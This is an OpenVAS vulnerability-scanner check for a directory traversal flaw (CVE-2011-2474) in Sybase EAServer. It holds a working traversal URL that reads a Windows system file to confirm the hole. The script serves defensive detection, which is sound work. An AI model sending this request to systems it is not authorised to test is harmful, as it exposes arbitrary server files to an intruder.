###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sybase_easerver_47987.nasl 12092 2018-10-25 11:43:33Z cfischer $
#
# Sybase EAServer Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103478");
  script_bugtraq_id(47987);
  script_cve_id("CVE-2011-2474");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 12092 $");
  script_name("Sybase EAServer Directory Traversal Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2018-10-25 13:43:33 +0200 (Thu, 25 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-04-25 14:01:37 +0200 (Wed, 25 Apr 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80, 8000);
  script_mandatory_keys("EAServer/banner");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47987");
  script_xref(name:"URL", value:"http://www.sybase.com/products/modelingdevelopment/easerver");
  script_xref(name:"URL", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=912");
  script_xref(name:"URL", value:"http://www.sybase.com/detail?id=1093216");

  script_tag(name:"solution", value:"The vendor has released fixes. Please see the references for more
  information.");

  script_tag(name:"summary", value:"Sybase EAServer is prone to a directory-traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary files
  within the context of the webserver. Information harvested may aid in launching further attacks.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_http_port( default:80 );

banner = get_http_banner( port:port );
if( !banner || "EAServer" >!< banner )
  exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  pattern = str_replace( find:"\", string:file, replace:"\\" );

  url = string( "/.\\..\\.\\..\\.\\..\\.\\", file );

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );